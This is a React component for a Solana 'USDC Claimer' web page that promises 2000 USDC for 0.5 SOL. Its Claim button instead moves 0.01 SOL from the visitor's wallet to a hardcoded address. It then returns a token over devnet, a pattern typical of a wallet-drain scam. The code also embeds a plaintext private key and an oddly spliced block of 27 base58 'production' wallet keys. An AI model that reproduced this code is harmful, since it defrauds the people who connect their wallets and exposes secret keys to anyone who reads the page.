/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2yCgVJHqEjSCz2t7eWism6PwbJxEcHNEohjMv5yeLHRDsqZpZvPVMchpyAQUEb8mZRPgsey5uA7azSP7HvgjzxUn"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5gwHk4VSKeYXHkvZDPTV9KT9kVVAy9FM2C8nHFc3t6my9nRS8CQqpqkWYfbqvbwqx9EcTNuwGi6ZKJ3fWQt2ztQQ",
  "key1": "3Z8yBSaLChJ3UXDv2MhTnfc86MaR32MprVNx82GcSy9eixWdMNLQMaWxfaMNH4MGc2tyWqckdkf4zoLKApvfYdtF",
  "key2": "24cFu3cNx3iuFkrtMFVQfuDPw2CkVWKu7Y6icnxhuzL3nANxNy1VqEVJWu9YQrQ5GeLej4hWnRrooxhnFV1NpFyi",
  "key3": "5pA3w3NoywWqjqp8XcguAqpqSzrAsqwa7b3VfTVWdqjGzANdB2d6iEexZ8DJ82R3sZajfHnLzEmEYzWn4H2PdujZ",
  "key4": "3MZTuzqh2DxewLgjwkh5xbZv11NWQsLxwkCNwBL8GxyCdjtJVR229xJwtE8xXamXRezEyWT4hEhFpfi3V7AKBPRM",
  "key5": "39o6XPGMX2umctrAjWZiSm7c8RkYur6zVzVDDHM5kRfrsrWmLszxf5X5hWHwVzT72XjkBGt41HY5KUSq3KfqxjeW",
  "key6": "3uD7de2spbv8Rr43e14VJ4oyXkoyq2GydJNEB4n4kHvBvrp2ohVPwbxC1zrUHCy27edeu2qoMp44SomWsRKZQuBb",
  "key7": "2iM4Vju6WVmWs2zU8FtvCyJhprYQxwTW9f6Mwq52SAxBM8QbVLsnbsqWNsUTqXG2yRMXezqtJiQs6s4dvjnxABxB",
  "key8": "5HLef4adoK8paHNEmk49ZVnbGjArs5uYYttqmBKj63MN4HU3CFSFRp9sZFBb2yY4sM1eRS83MPHFDAF6BzqAnmKz",
  "key9": "25qzr7hj6ZkRzUYN9asp3C3Y2F2y44Mdq3izVJEadCvDagVS93NV9jQJw9uVjUiUTLViMcTfhAAgGnxGmPSkN41t",
  "key10": "27wkJhvML9hdSjT9PaKSyFMXFNYnzVq1TzkPT68NnpXxtrbE7GABWJ13Xr28B1jLu2Y5HU96avT8WraZfs4PFWXA",
  "key11": "4BWEh1Vwb4F6XwgHGBH8G76rMqosZBZWnVBgEbGDJ5fcdQeRPwi2WpAy8kPdYJ1kxcg2prkXeKDfryCfvyA9hbKL",
  "key12": "3qmmdGxYzwsXKBhckaVvY9nfwA1wBy9ZuwDxeBEzbM2D2Aaws1UWM8dHNTBbdMdDAvzbpKGLptQNZq6N2vFpSEZH",
  "key13": "67WFkdWhYHFLLXXAAb5J1YaeF7YoNdCZcCFTDHWxgF3hKHQuDzwLaFpDCZQKeKGTfquTfnT2yeCKPbPBdNShQt3t",
  "key14": "2w9bGs1LvkS9dXVPGzVazpZHEHjJSke2bbGjnsyt9kd8ZidwTi9dRscjP9KbUgLPquNEQrVnb6rjbdiYmszMUAS4",
  "key15": "2242vaN8b6EMyPoAuNG2CSUexUqYnbAZpLCLK28EjmuoZmnvTSbPuhvrWFzMwELCvZoXo4W1Vv9UL9yeksSfz4ba",
  "key16": "2xL7EKMzCSTHzWM5RDdrU3wK3ptC53gUCb8qF3ZADDss3YhCY7HFfTGuzHzg28Zic1RYFYR2fibA5ccJbpGheo2p",
  "key17": "4jr56bQifRtzaWdTfVmGqpmvZo13sgj3QKwkmJTdrHX5ApkUAd6BAGd3Ane4ytjnebepueBZPY6D6NR1LiMMqddS",
  "key18": "5N4DgA2xVfRyD9MHgtuh2hboaHDPKoe666UaYQUkZ6o9YYsVgcVNe8srw6a5Bjj6DzN4fsCXC8raamzEEya1MnCz",
  "key19": "3wvP7xTgzSPLTS2Zdmtt3CLLBcgoPFc3ma3uvjoJiz9mBna2nLEkz7Lzk856PfnWdQ4ygrbaHVTbHHUptUyxiGbi",
  "key20": "5xkS8dXytwPUsgvL9vn9QVKKpTSWTCtYYgpSM5NSoyUMFmYYP1RxGcDYpDiMLeFmSAKrUmYsyAFLG7UGMhFHq89c",
  "key21": "229VnHSBZzqRKdYQsb19zDd4apyiv1vbYHEaqw53ZEacMUymvCzgDixfxGgerg3sYTUW2HALksTmRwv5uTwgtPW5",
  "key22": "5KEdcVd8A1NkNV1jvLTshzosQL2tkup8vi4AJWZRTDRmraCSHG8nUsEr472kUdtapStqgVKKHL9HA9pq5gZBGBqg",
  "key23": "2eUaVKGSuhyQRvq2pkEatdnM3YPpEhz6Ti6c3RCKEmVJrukcPNTr8QZf1jAwgF81TPLHjFK2MQLuP9GYsTZkudxD",
  "key24": "54PoJZoaUPWCWL3Ti74cuysjKeqa4JVKBHGSxYt47XfEKibU2Es1jEC7fuL5F4971w6JesprsBmmkFWqs5GG4SYw",
  "key25": "21x8dkPaudredWnW4fja5KHPGtG1qLbWHKPYhkgHvtxEUK8Pyn9EsGPu8ams61pLXZ6Zubf4afj2CHL5v6zXAfz3",
  "key26": "5oaphXD4bvAExiRMWpYmTWLmQSRuKNWWHCG6rkZBN3PCg9t6fAmLd4qgaCWJMU93m6WABKeFwr4Es23KbU9vEidu"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
